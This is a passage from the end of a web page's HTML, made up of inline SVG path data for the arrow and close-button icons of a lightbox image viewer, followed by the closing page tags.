6v4h-0.25v-4h0.25zM3.125 6v4h-0.25v-4h0.25zM2.625 6v4h-0.25v-4h0.25zM2.125 6v4h-0.25v-4h0.25zM1.625 6v4h-0.25v-4h0.25zM1 6h0.125v4h-0.125l0-4zM9 10h-0.125v-4h0.125v-3.586l0.125 0.125v10.922l-0.125 0.125v-3.586z"></path><path class="fbx-icon-arrows-6" d="M16 8l-8-8v5h-8l-0 6h8v5z"></path><path class="fbx-icon-arrows-7" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM12.707 8.707l-4 4c-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293c-0.391-0.391-0.391-1.024 0-1.414l2.293-2.293h-5.586c-0.552 0-1-0.448-1-1s0.448-1 1-1h5.586l-2.293-2.293c-0.391-0.391-0.391-1.024 0-1.414s1.024-0.391 1.414 0l4 4c0.391 0.391 0.391 1.024 0 1.414z"></path><path class="fbx-icon-arrows-8" d="M16 16h-16v-16h16l-0 16zM2 2v12h12l0-12h-12zM9 11.5l3.5-3.5-3.5-3.5v2.5h-5v2h5v2.5z"></path><path class="fbx-icon-arrows-9" d="M0 5h1v6h-1zM2 5h1v6h-1zM4 5h1v6h-1zM16 8l-7-7v4h-3v6h3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM9 11.5v-2.5h-5v-2h5v-2.5l3.5 3.5-3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 14.5c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5 6.5 2.91 6.5 6.5-2.91 6.5-6.5 6.5zM12.707 7.293l-4-4c-0.39-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414l2.293 2.293h-5.586c-0.552 0-1 0.448-1 1s0.448 1 1 1h5.586l-2.293 2.293c-0.391 0.391-0.391 1.024 0 1.414 0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293l4-4c0.39-0.391 0.39-1.024 0-1.414z"></path></svg></button><button class="fbx-close fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-close fbx-icon-default"><path class="fbx-icon-close-default" d="M13.405 11.404q0 0.357-0.25 0.607l-1.214 1.214q-0.25 0.25-0.607 0.25t-0.607-0.25l-2.625-2.625-2.625 2.625q-0.25 0.25-0.607 0.25t-0.607-0.25l-1.214-1.214q-0.25-0.25-0.25-0.607t0.25-0.607l2.625-2.625-2.625-2.625q-0.25-0.25-0.25-0.607t0.25-0.607l1.214-1.214q0.25-0.25 0.607-0.25t0.607 0.25l2.625 2.625 2.625-2.625q0.25-0.25 0.607-0.25t0.607 0.25l1.214 1.214q0.25 0.25 0.25 0.607t-0.25 0.607l-2.625 2.625 2.625 2.625q0.25 0.25 0.25 0.607z"></path><path class="fbx-icon-close-flat" d="M12.667 3q0.286 0 0.477 0.19t0.19 0.477q0 0.281-0.193 0.474l-4.198 4.193 4.198 4.193q0.193 0.193 0.193 0.474 0 0.286-0.19 0.477t-0.477 0.19q-0.281 0-0.474-0.193l-4.193-4.198-4.193 4.198q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l4.198-4.193-4.198-4.193q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19q0.281 0 0.474 0.193l4.193 4.198 4.193-4.198q0.193-0.193 0.474-0.193z"></path></svg></button><button class="fbx-open-caption">…</button></div></div></body></html>